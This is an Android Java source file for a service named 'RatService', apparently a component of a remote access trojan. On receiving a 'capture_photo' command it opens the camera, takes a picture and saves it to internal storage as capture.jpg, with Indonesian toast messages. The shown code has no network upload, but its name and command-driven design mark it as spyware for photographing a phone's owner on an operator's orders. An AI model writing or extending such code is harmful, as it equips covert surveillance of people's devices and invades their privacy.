package com.manta.x;

import android.app.Service;
import android.content.Intent;
import android.hardware.Camera;
import android.os.IBinder;
import android.widget.Toast;
import java.io.FileOutputStream;

public class RatService extends Service {
    private Camera camera;
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String cmd = intent.getStringExtra("command");
        if ("capture_photo".equals(cmd)) {
            try {
                camera = Camera.open();
                camera.takePicture(null, null, (data, cam) -> {
                    try {
                        FileOutputStream fos = openFileOutput("capture.jpg", MODE_PRIVATE);
                        fos.write(data);
                        fos.close();
                        Toast.makeText(RatService.this, "Foto tersimpan di internal/capture.jpg", Toast.LENGTH_LONG).show();
                    } catch (Exception e) {}
                    camera.release();
                });
            } catch (Exception e) {
                Toast.makeText(this, "Gagal akses kamera: "+e.getMessage(), Toast.LENGTH_SHORT).show();
            }
        }
        return START_NOT_STICKY;
    }
    @Override public IBinder onBind(Intent intent) { return null; }
}